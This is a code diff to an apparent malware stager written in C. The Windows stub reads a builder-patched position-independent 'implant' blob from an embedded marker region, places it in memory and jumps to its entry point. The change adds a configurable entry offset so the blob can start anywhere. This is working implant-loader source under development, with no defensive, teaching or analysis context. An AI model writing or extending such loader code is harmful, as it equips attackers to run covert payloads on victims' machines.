@@ -32,9 +32,10 @@ static volatile BYTE stub_config_region[CONFIG_MARKER_LEN + sizeof(DWORD) + CONF
 
 /* PIC blob region */
 __attribute__((section(".data"), used))
-static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
+static volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + sizeof(DWORD) + PIC_MAX_CAPACITY] = {
     'S','P','E','C','P','I','C','B','L','O','B','\0',
-    0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, /* pic_size */
+    0x00, 0x00, 0x00, 0x00, /* entry_offset */
 };
 
 /* ------------------------------------------------------------------ */
@@ -77,8 +78,10 @@ void WinMainCRTStartup(void) {
     g_stub_exit_code = 206;
 
     DWORD pic_sz = *(DWORD *)pp;
-    PBYTE pic_dat = pp + sizeof(DWORD);
+    DWORD entry_off = *(DWORD *)(pp + sizeof(DWORD));
+    PBYTE pic_dat = pp + sizeof(DWORD) + sizeof(DWORD); /* skip size + entry_offset */
     if (pic_sz == 0) { g_stub_exit_code = 106; goto done; }
+    if (entry_off >= pic_sz) entry_off = 0; /* safety fallback */
     g_stub_exit_code = 207;
 
     SIZE_T alloc_sz = (SIZE_T)pic_sz + sizeof(DWORD) + (SIZE_T)cfg_len;
@@ -94,9 +97,8 @@ void WinMainCRTStartup(void) {
 
     g_stub_exit_code = 209;
 
-    /* Jump to PIC entry — implant_entry MUST be at offset 0 in the blob.
-       This is ensured by linking entry.o first (see implant/Makefile). */
-    fn_implant_entry entry = (fn_implant_entry)exec;
+    /* Jump to PIC entry at the correct offset (read from builder-patched field) */
+    fn_implant_entry entry = (fn_implant_entry)((PBYTE)exec + entry_off);
     entry(NULL);
     g_stub_exit_code = 99;
 
